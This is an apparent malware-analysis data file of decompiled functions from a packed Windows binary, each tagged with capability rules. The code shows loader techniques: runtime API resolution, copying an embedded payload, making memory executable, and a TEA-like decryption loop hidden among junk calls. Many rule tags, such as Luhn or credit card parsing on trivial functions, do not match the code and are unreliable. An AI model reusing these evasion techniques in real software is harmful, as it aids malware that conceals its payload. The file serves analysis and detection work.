{
    "00401077": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00401077(int32_t *arg_8h)\n\n{\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t unaff_EBX;\n    int32_t iVar1;\n    int32_t unaff_EDI;\n    uint var_104ch;\n    uint szLang;\n    uint lpszVolumeName;\n    uint lpBuffer;\n    uint uStack76;\n    uint *puStack72;\n    uint uStack68;\n    uint *puStack64;\n    uint var_38h;\n    uint *var_34h;\n    uint *var_30h;\n    uint *NumberOfPages;\n    uint *var_28h;\n    uint *var_24h;\n    uint lpNumberOfEventsRead;\n    char *var_1ch;\n    uint32_t var_18h;\n    uint *nSize;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint *var_4h;\n    \n    var_4h = 0x401084;\n    fcn.00408c90();\n    iVar1 = *arg_8h;\n    var_18h = arg_8h[1];\n    var_ch = unaff_EDI;\n    var_4h = unaff_EBX;\n    if (*0x1d5f474 == 0x134) {\n        var_10h = 0;\n        nSize = &fcn.00401077::lpszVolumeName;\n        var_18h = 0;\n        var_1ch = \"napede\";\n        lpNumberOfEventsRead = 0;\n        var_24h = NULL;\n        var_28h = 0x4010b6;\n        (*_sym.imp.KERNEL32.dll_LCMapStringA)();\n        var_28h = &fcn.00401077::var_38h;\n        NumberOfPages = NULL;\n        var_30h = NULL;\n        var_34h = 0x4010c2;\n        (*_sym.imp.KERNEL32.dll_GetCurrentConsoleFont)();\n        var_34h = 0x4010c8;\n        (*_sym.imp.KERNEL32.dll_GetUserDefaultLangID)();\n        var_34h = &fcn.00401077::lpNumberOfEventsRead;\n        var_38h = 0;\n        puStack64 = &fcn.00401077::lpBuffer;\n        uStack68 = 0;\n        puStack72 = 0x4010d8;\n        (*_sym.imp.KERNEL32.dll_PeekConsoleInputA)();\n    }\n    if (*0x1d5f474 == 0x114e) {\n        var_10h = 0;\n        nSize = &fcn.00401077::szLang;\n        var_18h = 0;\n        var_1ch = 0x4010f5;\n        sub.KERNEL32.dll_VerLanguageNameW();\n    }\n    var_24h = *0x414f98;\n    lpNumberOfEventsRead = *0x414f9c;\n    var_10h = 0x40110d;\n    fcn.0040106a();\n    if (*0x1d5f474 == 0xb54) {\n        var_10h = 0;\n        nSize = NULL;\n        var_18h = 0;\n        var_1ch = NULL;\n        lpNumberOfEventsRead = 0;\n        var_24h = 0x401128;\n        (*_sym.imp.KERNEL32.dll_WriteFile)();\n        var_24h = NULL;\n        var_28h = &fcn.00401077::lpszVolumeName;\n        NumberOfPages = 0x401136;\n        (*_sym.imp.KERNEL32.dll_FindFirstVolumeA)();\n        NumberOfPages = &fcn.00401077::nSize;\n        var_30h = &fcn.00401077::var_104ch;\n        var_34h = NULL;\n        var_38h = 0x401148;\n        (*_sym.imp.KERNEL32.dll_GetComputerNameExW)();\n    }\n    var_28h = *0x414fa0;\n    nSize = *0x414fa4;\n    var_1ch = 0x20;\n    do {\n        var_8h = 5;\n        var_10h = 0x401174;\n        fcn.0040105a();\n        if (*0x1d5f474 == 0x4c3) {\n            var_10h = 0;\n            nSize = NULL;\n            var_18h = 0x401188;\n            (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n            var_18h = 0;\n            var_1ch = NULL;\n            lpNumberOfEventsRead = 0;\n            var_24h = NULL;\n            var_28h = 0x401192;\n            (*_sym.imp.KERNEL32.dll_ChangeTimerQueueTimer)();\n        }\n        var_4h = var_4h + var_28h;\n        if (*0x1d5f474 == 0xfa9) {\n            *0x1cf77e4 = 0xedeb2e40;\n        }\n        *0x1cf77e0 = 0x9150ce2e;\n        if (*0x1d5f474 == 0x3eb) {\n            var_10h = 0;\n            nSize = NULL;\n            var_18h = 0;\n            var_1ch = 0x4011d2;\n            (*_sym.imp.KERNEL32.dll_AddConsoleAliasA)();\n            *0x1cf45dc = 0;\n        }\n        var_4h = var_4h ^ var_10h + iVar1;\n        if (*0x1d5f474 == 0xdab) {\n            var_10h = 0;\n            nSize = &fcn.00401077::NumberOfPages;\n            var_18h = 0;\n            var_1ch = 0x4011fb;\n            (*_sym.imp.KERNEL32.dll_FreeUserPhysicalPages)();\n            var_1ch = NULL;\n            lpNumberOfEventsRead = 0;\n            var_24h = 0x401203;\n            (*_sym.imp.KERNEL32.dll_SetVolumeMountPointA)();\n            var_24h = &fcn.00401077::var_30h;\n            var_28h = NULL;\n            NumberOfPages = &fcn.00401077::lpBuffer;\n            var_30h = NULL;\n            var_34h = 0x401213;\n            (*_sym.imp.KERNEL32.dll_ReadConsoleInputW)();\n            var_34h = 0x401219;\n            (*_sym.imp.KERNEL32.dll_GetUserDefaultLangID)();\n            var_34h = NULL;\n            var_38h = 0;\n            puStack64 = NULL;\n            uStack68 = 0;\n            puStack72 = 0x401223;\n            (*_sym.imp.KERNEL32.dll_EnumCalendarInfoExW)();\n            puStack72 = &fcn.00401077::var_34h;\n            uStack76 = 0x40122d;\n            (*_sym.imp.KERNEL32.dll_InterlockedIncrement)();\n        }\n        var_10h = 0x401237;\n        fcn.00401071();\n        var_ch = 4;\n        var_4h = var_24h + var_18h * 4;\n        var_8h = var_18h >> 5;\n        var_10h = 0x401273;\n        fcn.00401074();\n        var_ch = var_10h + extraout_EDX;\n        nSize = 0x401281;\n        var_4h = fcn.00401063();\n        nSize = 0x40128f;\n        fcn.00401060();\n        iVar1 = iVar1 - var_4h;\n        *0x431f98 = 0;\n        nSize = 0x4012a0;\n        fcn.00401053();\n        var_1ch = var_1ch + -1;\n    } while (var_1ch != NULL);\n    *arg_8h = iVar1;\n    arg_8h[1] = extraout_EDX_00;\n    return;\n}\n",
        "token_count": 1861
    },
    "004012b8": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.004012b8(void)\n\n{\n    int32_t arg_8h;\n    uint lpFilename;\n    uint lpWriteRegion;\n    uint lpBuffer;\n    uint dwBufferCoord;\n    uint dwBufferSize;\n    uint32_t var_4h;\n    \n    arg_8h = *0x1cf45e0;\n    for (var_4h = *0x1d5f474 >> 3; var_4h != 0; var_4h = var_4h - 1) {\n        if (*0x1d5f474 == 0xae9) {\n            dwBufferSize = 0;\n            dwBufferCoord = 0;\n            (*_sym.imp.KERNEL32.dll_WriteConsoleOutputW)(0, &lpBuffer, 0, 0, &lpWriteRegion);\n            (*_sym.imp.KERNEL32.dll_GetEnvironmentStrings)();\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasesLengthA)(0);\n            (*_sym.imp.KERNEL32.dll_GetConsoleTitleA)(0, 0);\n            (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, &lpFilename, 0);\n            (*_sym.imp.KERNEL32.dll_CreateTimerQueueTimer)(0, 0, 0, 0, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)\n                      (L\"Bipuze fuvemahik xowagadid honupebew jakahizihu\", L\"Suzulumitolos tafig\");\n            (*_sym.imp.KERNEL32.dll_EndUpdateResourceW)(0, 0);\n        }\n        fcn.00401077(arg_8h);\n        arg_8h = arg_8h + 8;\n    }\n    return;\n}\n",
        "token_count": 384
    },
    "00401406": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nvoid fcn.00401406(void)\n\n{\n    code *pcVar1;\n    int32_t extraout_ECX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint lpString1;\n    uint lpConsoleTitle;\n    \n    fcn.004013f2();\n    *0x1cf77dc = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x416ba8);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    *0x1cf45e4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x1cf77dc, \"LocalAlloc\");\n    *0x431f9c = (*pcVar1)(*0x1cf77dc, 0x411c78);\n    *0x1cf45e0 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0, *0x1d5f474);\n    fcn.004013c7();\n    uVar2 = 0;\n    do {\n        if (uVar2 < 0x50a28) {\n            (*_sym.imp.USER32.dll_RealGetWindowClassA)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        }\n        if (0x11c825e < uVar2) break;\n        uVar2 = uVar2 + 1;\n    } while ((uVar2 >> 0x1f < 0x3f) || ((uVar2 >> 0x1f < 0x40 && (uVar2 < 0x27e32a85))));\n    *0x1d5f478 = *0x415a9c;\n    fcn.00401390();\n    uVar2 = 0;\n    if (*0x1d5f474 != 0) {\n        do {\n            if (*0x1d5f474 == 0xd8c) {\n                (*_sym.imp.KERNEL32.dll_GetConsoleTitleA)(&lpConsoleTitle, 0);\n                (*_sym.imp.KERNEL32.dll_GetCommandLineW)();\n            }\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *0x1d5f474);\n    }\n    iVar3 = 0;\n    do {\n        if (*0x1d5f474 + iVar3 == 0x5e) {\n            (*_sym.imp.KERNEL32.dll_HeapAlloc)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_lstrcpynW)(&lpString1, 0, 0);\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0xa69b);\n    fcn.004012b8();\n    iVar3 = 0;\n    do {\n        if (iVar3 == 23000) {\n            fcn.00401376();\n            iVar3 = extraout_ECX;\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x2f5303);\n    iVar3 = 0x7b;\n    do {\n        if (*0x1d5f474 == 0x54d) {\n            (*_sym.imp.KERNEL32.dll_GetDefaultCommConfigW)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_GetSystemWindowsDirectoryA)(&lpConsoleTitle, 0);\n        }\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    return;\n}\n",
        "token_count": 767
    },
    "00401d1e": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00401e11: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00401e16)\n// WARNING: Removing unreachable block (ram,0x00401e44)\n// WARNING: Removing unreachable block (ram,0x00401e1c)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00401d1e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004045cc(0x412e50, 0x18);\n    fcn.00403ad2(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x416050 != 1) {\n        *0x41604c = 1;\n        *0x416048 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.00404ac4(*0x1d605ec);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.00404ac4(*0x1d605e8);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.00404abb();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.00404ac4(*piVar2);\n                        iVar3 = fcn.00404abb();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.00404ac4(*0x1d605ec);\n                        piVar1 = fcn.00404ac4(*0x1d605e8);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.00401c58(0x4101f4);\n        }\n        fcn.00401c58(0x4101fc);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.004039f8(8);\n    }\n    return;\n}\n",
        "token_count": 802
    },
    "004022f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004022f0(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x414214) {\n        return;\n    }\n    *0x416870 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x416874 = &arg_8h;\n    *0x4167b0 = 0x10001;\n    *0x416758 = 0xc0000409;\n    *0x41675c = 1;\n    var_328h = *0x414214;\n    var_324h = *0x414218;\n    *0x416764 = unaff_retaddr;\n    *0x41683c = in_GS;\n    *0x416840 = in_FS;\n    *0x416844 = in_ES;\n    *0x416848 = in_DS;\n    *0x41684c = unaff_EDI;\n    *0x416850 = unaff_ESI;\n    *0x416854 = unaff_EBX;\n    *0x416858 = in_EDX;\n    *0x41685c = in_ECX;\n    *0x416860 = in_EAX;\n    *0x416864 = unaff_EBP;\n    *0x416868 = unaff_retaddr;\n    *0x41686c = in_CS;\n    *0x416878 = in_SS;\n    *0x4167a8 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.00404a41(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x411218);\n    if (*0x4167a8 == 0) {\n        fcn.00404a41(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 811
    },
    "00403220": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00403220(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.004039f8(0);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "00408073": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00408073(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00404abb();\n    var_4h = 0;\n    if (*0x416a9c == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"USER32.DLL\");\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"MessageBoxA\");\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x416a9c = fcn.00404a49(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, \"GetActiveWindow\");\n        *0x416aa0 = fcn.00404a49(uVar3);\n        uVar3 = (*pcVar4)(iVar2, \"GetLastActivePopup\");\n        *0x416aa4 = fcn.00404a49(uVar3);\n        uVar3 = (*pcVar4)(iVar2, \"GetUserObjectInformationA\");\n        *0x416aac = fcn.00404a49(uVar3);\n        if (*0x416aac != 0) {\n            uVar3 = (*pcVar4)(iVar2, \"GetProcessWindowStation\");\n            *0x416aa8 = fcn.00404a49(uVar3);\n        }\n    }\n    if ((*0x416aa8 != iVar1) && (*0x416aac != iVar1)) {\n        pcVar4 = fcn.00404ac4(*0x416aa8);\n        pcVar5 = fcn.00404ac4(*0x416aac);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x004081b5;\n        }\n    }\n    if ((((*0x416aa0 != iVar1) && (pcVar4 = fcn.00404ac4(*0x416aa0),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x416aa4 != iVar1 && (pcVar4 = fcn.00404ac4(*0x416aa4),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x004081b5:\n    pcVar4 = fcn.00404ac4(*0x416a9c);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 818
    },
    "004094e1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004094e1(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004045cc(0x413158, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.004020e7();\n        *puVar2 = 0;\n        puVar2 = fcn.004020d4();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x1d5f484)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x1d5f4a0;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.00409edd(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.004020d4();\n                    *puVar2 = 9;\n                    puVar2 = fcn.004020e7();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.00408dae(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.004095b3(0x413158);\n                goto code_r0x004095ad;\n            }\n        }\n        puVar2 = fcn.004020e7();\n        *puVar2 = 0;\n        puVar2 = fcn.004020d4();\n        *puVar2 = 9;\n        fcn.00401a75(0, 0, 0, 0, 0);\n    }\ncode_r0x004095ad:\n    fcn.00404611();\n    return;\n}\n",
        "token_count": 630
    },
    "00401053": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401053(void)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + 0x61c88647;\n    return;\n}\n",
        "token_count": 44
    },
    "0040106a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040106a(void)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + -0x3910c934;\n    return;\n}\n",
        "token_count": 45
    },
    "00401074": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401074(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + param_1;\n    return;\n}\n",
        "token_count": 47
    },
    "00401376": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401376(void)\n\n{\n    uint var_4h;\n    \n    return;\n}\n",
        "token_count": 23
    },
    "004013bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004013bc(void)\n\n{\n    *0x1d5f474 = *0x1d5f474 + 0xb2d3b;\n    return;\n}\n",
        "token_count": 42
    },
    "004013c7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "allocate memory"
        ],
        "decompiled_code": "\nvoid fcn.004013c7(void)\n\n{\n    uint lpflOldProtect;\n    uint flNewProtect;\n    \n    flNewProtect = 0x40;\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(*0x1cf45e0, *0x1d5f474, 0x40, &lpflOldProtect);\n    return;\n}\n",
        "token_count": 81
    },
    "00401a9b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00401a9b(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint arg_10h;\n    uint var_4h;\n    \n    fcn.004045cc(0x412e10, 0xc);\n    if (*(unaff_EBP + 8) == 0) {\n        puVar1 = fcn.004020d4();\n        *puVar1 = 0x16;\n        fcn.00401a75(0, 0, 0, 0, 0);\n    }\n    else {\n        iVar2 = fcn.004047bc();\n        fcn.004048d4(1, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0;\n        iVar2 = fcn.004047bc();\n        arg_8h_00 = fcn.00404971(iVar2 + 0x20);\n        iVar2 = unaff_EBP + 0xc;\n        arg_10h = 0;\n        uVar4 = *(unaff_EBP + 8);\n        iVar3 = fcn.004047bc();\n        uVar4 = fcn.0040508c(iVar3 + 0x20, uVar4, arg_10h, iVar2);\n        *(unaff_EBP + -0x1c) = uVar4;\n        iVar2 = fcn.004047bc();\n        fcn.00404a0d(arg_8h_00, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.00401b37();\n    }\n    fcn.00404611();\n    return;\n}\n",
        "token_count": 458
    },
    "00401b37": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401b37(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004047bc();\n    fcn.00404942(1, iVar1 + 0x20);\n    return;\n}\n",
        "token_count": 53
    },
    "00401e4a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401e4a(uint arg_8h)\n\n{\n    fcn.00401d1e(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 43
    },
    "00405cb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00405ccc)\n// WARNING: Removing unreachable block (ram,0x00405cd2)\n// WARNING: Removing unreachable block (ram,0x00405cd4)\n\nvoid fcn.00405cb8(void)\n\n{\n    return;\n}\n",
        "token_count": 63
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00409fa4": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.00409fa4(void)\n\n{\n    *0x414f88 = (*_sym.imp.KERNEL32.dll_CreateFileA)(\"CONOUT$\", 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 61
    },
    "00401390": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00401390(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    iVar3 = *0x1d5f478;\n    uVar2 = *0x1d5f474;\n    iVar1 = *0x1cf45e0;\n    uVar4 = 0;\n    if (*0x1d5f474 != 0) {\n        do {\n            *(uVar4 + iVar1) = *(iVar3 + 0xb2d3b + uVar4);\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < uVar2);\n    }\n    return;\n}\n",
        "token_count": 164
    },
    "004013f2": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004013f2(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    do {\n        cVar1 = \"kernel32.dll\"[iVar2];\n        *(iVar2 + 0x416ba8) = cVar1;\n        iVar2 = iVar2 + 1;\n    } while (cVar1 != '\\0');\n    return;\n}\n",
        "token_count": 91
    }
}